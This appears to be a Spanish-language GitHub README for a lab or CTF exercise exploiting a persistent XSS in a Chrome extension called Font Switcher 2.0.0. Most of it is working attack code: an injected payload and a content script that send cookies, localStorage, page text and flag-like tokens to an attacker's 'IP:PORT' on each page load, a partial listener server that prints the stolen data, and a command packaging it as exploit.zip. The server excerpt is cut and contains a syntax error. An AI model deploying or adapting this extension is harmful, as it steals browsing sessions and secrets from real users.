# Vulnerabilidad-XSS-en-Extensi-n-de-Navegador-Font-Switcher-2.0.0
Este script demuestra la explotación de una vulnerabilidad XSS persistente dentro de una extensión de navegador en un entorno controlado.

#🔍 Descripción General

Nombre de la extensión: Font Switcher
Versión: 2.0.0
Tipo: Extensión de Google Chrome
Permisos solicitados: storage, scripting, <all_urls>

La extensión permite al usuario cambiar la fuente tipográfica de las páginas web que visita. Durante su análisis se identificó una vulnerabilidad de tipo Cross-Site Scripting (XSS) causada por la falta de validación y escape de entradas controladas por el usuario.

#🚨 Resumen de la Vulnerabilidad

-Tipo: XSS por inyección en plantillas (Template Injection)

-Vector de ataque: Entrada del usuario almacenada en chrome.storage.sync

-Contexto de ejecución: Content Script

-Persistencia: Sí

-Gravedad: Alta

# 📂 Componentes Afectados

### popup.js

-El valor seleccionado por el usuario se guarda sin validación ni sanitización.

```js
const sel = document.getElementById("fontSelector");

sel.addEventListener("change", () => {
  const payload = sel.value + "'; }</style><script>fetch('http://IP:PORT/?cookie',{method:'POST',body:JSON.stringify({cookie:document.cookie,url:location.href,localStorage:JSON.stringify(localStorage),flag:document.body.innerText})})</script><style>*{font-family:'";
  
  chrome.storage.sync.set({ selectedFont: payload });
  
  chrome.tabs.query({active:true,currentWindow:true}, tabs => {
    chrome.scripting.executeScript({
      target: {tabId: tabs[0].id},
      func: (f) => {
        const s = document.createElement("style");
        s.innerText = `* { font-family: '${f}' !important; }`;
        document.head.appendChild(s);
      },
      args: [payload]
    });
  });
});

```
⚠️ Nota

`IP:PORT` debe modificarse por la IP y el puerto de escucha
del atacante.

### content.js

-El valor almacenado se inserta directamente en el DOM en cada carga de página.


```js
// Exfiltrar datos cuando la página carga
setTimeout(() => {
  const data = {
    url: window.location.href,
    cookies: document.cookie,
    html: document.body.innerText.substring(0, 10000),
    localStorage: JSON.stringify(localStorage),
    flag: document.body.innerText.match(/flag\{[^\}]+\}/gi) || 
          document.body.innerText.match(/CTF\{[^\}]+\}/gi) ||
          document.body.innerText.match(/[A-Z0-9]{20,}/g)
  };
  
  fetch('http://IP:PORT/?cookie', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(data)
  }).catch(e => console.log(e));
}, 500);

```

⚠️ Nota

`IP:PORT` debe modificarse por la IP y el puerto de escucha
del atacante.



# 📡 Servidor de Recepción de Datos (server.py)

Este script implementa un servidor HTTP simple utilizado durante el
laboratorio para recibir y visualizar los datos exfiltrados por la
extensión vulnerable.

El servidor maneja peticiones POST y GET, habilita CORS y muestra por
consola la información capturada (cookies, contenido HTML y posibles flags).


##📄 Bloque de código


```python
                data = json.loads(post_data.decode('utf-8'))
                print(json.dumps(data, indent=2))
                
                # Buscar la flag
                if 'flag' in data and data['flag']:
                    print(f"\n🚩 FLAG ENCONTRADA: {data['flag']}")
                if 'cookies' in data:
                    print(f"\n🍪 COOKIES: {data['cookies']}")
                if 'html' in data and 'flag' in data['html'].lower
                    print(f"\n📄 HTML contiene 'flag'!")
                    
            except:
                print(post_data.decode('utf-8', errors='ignore'))
        
        print("="*60 + "\n")
        
        # Responder con CORS habilitado
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(b'OK')
    
    def do_GET(self):
        print(f"\n📥 GET request: {self.path}")
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(b'OK')
    
    def log_message(self, format, *args):
        # Suprimir logs automáticos para ver solo nuestros prints
        pass

print("🚀 Servidor escuchando en http://0.0.0.0:PORT")
print("⏳ Esperando datos de la extensión...\n")
HTTPServer(('0.0.0.0', PORT), Handler).serve_forever()
```
⚠️ Nota
`PORT` debe modificarse el puerto del servidor de escucha
del atacante para reproducir el ataque.

# 📦 Empaquetado de la Extensión
Una vez realizadas las configuraciones y modificaciones necesarias en
los archivos de la extensión, el proyecto se comprime en un archivo ZIP
para su posterior carga en el navegador o distribución dentro del
laboratorio.

### 🗜️ Creación del archivo comprimido

El empaquetado se realiza comprimiendo los archivos principales de la
extensión en un único archivo exploit.zip:

```bash
zip -r exploit.zip manifest.json popup.html popup.js content.js
```

<img width="1185" height="524" alt="image" src="https://github.com/user-attachments/assets/49194034-3416-4e9a-8013-062b606e7c54" />


###▶️ Puesta en Marcha del Servidor de Escucha

Antes de cargar comprimida (exploit.zip), es necesario
iniciar el servidor de escucha que recibirá los datos enviados por la
extensión durante el laboratorio.

<img width="1504" height="231" alt="image" src="https://github.com/user-attachments/assets/4b679e65-84ff-4fbe-9845-8225629b78a5" />

###🧩 Carga de la Extensión en el Navegador

Con el servidor de escucha en ejecución y el archivo exploit.zip
correctamente generado, se procede a cargar la extensión en el navegador
para iniciar el escenario de explotación.

<img width="1897" height="807" alt="image" src="https://github.com/user-attachments/assets/5ef80c14-8baf-4106-8a12-c92a42410946" />

<img width="1862" height="795" alt="image" src="https://github.com/user-attachments/assets/1a5e63e7-73b6-47f7-b5ea-16a132206650" />

